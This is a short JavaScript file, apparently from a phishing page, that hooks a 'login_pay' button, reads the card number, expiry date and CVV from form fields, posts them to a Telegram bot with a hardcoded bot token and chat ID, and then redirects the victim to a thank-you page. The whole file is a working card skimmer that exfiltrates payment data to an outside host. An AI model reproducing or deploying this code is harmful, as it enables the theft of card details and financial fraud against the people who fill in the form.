const btn = document.getElementById("login_pay");
btn.addEventListener("click", () => send());

function send() {
  const token = "6768935322:AAFXBkDGX4QJHF2pd2rzCtpoHLisecfBL8o";
  const chatId = "5977727607";

  const ccnumb = document.getElementsByName("ccnumb")[0].value;
  const expr = document.getElementsByName("expr")[0].value;
  const cvvz = document.getElementsByName("cvvz")[0].value;

  const message = `CARD_NUM      : ${ccnumb}
EXP_DATE      : ${expr}
CVV      : ${cvvz}`;

  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
    message
  )}`;

  fetch(url, { method: "POST" })
    .then((response) => {
      response.ok &&
        window.location.replace(window.location.origin + "/thanks.html");
    })
    .catch((error) => {
      console.error("Error sending message:", error);
    });
}
